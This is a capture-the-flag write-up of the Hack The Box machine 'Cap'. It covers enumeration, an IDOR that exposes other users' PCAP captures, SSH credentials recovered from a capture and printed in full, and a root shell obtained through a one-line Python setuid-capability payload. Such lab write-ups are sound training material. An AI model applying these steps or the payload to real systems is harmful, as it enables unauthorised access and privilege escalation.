# Cap

> **Platform:** Hack The Box  
> **Difficulty:** Easy  
> **Operating System:** Linux

---
## Initial Enumeration

We start with basic enumeration:

```bash
nmap -sV -sC 10.129.34.119

echo "10.129.34.119 cap.htb" | sudo tee -a /etc/hosts
```

![](images/Pasted%20image%2020260626234058.png)

Checking the IP address in the web browser:

![](images/Pasted%20image%2020260626234658.png)

A bit of directory busting:

```bash
gobuster dir -u 10.129.34.119 -w /usr/share/wordlists/seclists/Discovery/Web-Content/
```

![](images/Pasted%20image%2020260626235132.png)

While exploring the application, we discover an **IDOR** on the **Data** page that allows us to download other users' **PCAP** files.

The IDs appear to be sequential, so trying **0** or **1** is usually a good guess for the administrator's capture.

We download the PCAP file, open it with **Wireshark**, follow the **TCP** stream, and soon enough we recover a set of SSH credentials belonging to **nathan**:

**Username:** `nathan`  
**Password:** `Buck3tH4TF0RM3!`

![](images/Pasted%20image%2020260627000057.png)

---

## Foothold

Now we simply SSH into the machine using the recovered credentials.

Retrieving the user flag is straightforward:

```bash
cat user.txt
```

![](images/Pasted%20image%2020260627000254.png)

---

## Privilege Escalation

On our way to privilege escalation, we start enumerating the machine and notice that the Python binary has the **SUID** capability.

```bash
ss -tulpn

cat /etc/passwd | grep home

getcap -r / 2>/dev/null
```

![](images/Pasted%20image%2020260627000537.png)

A quick visit to **GTFOBins** gives us a ready-to-use payload for SUID Python binaries:

https://gtfobins.org/gtfobins/python/

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Running it immediately spawns a root shell.

![](images/Pasted%20image%2020260627001106.png)

From there, all that's left is to retrieve the root flag.

Easy machine.

---

**— 0xchnk**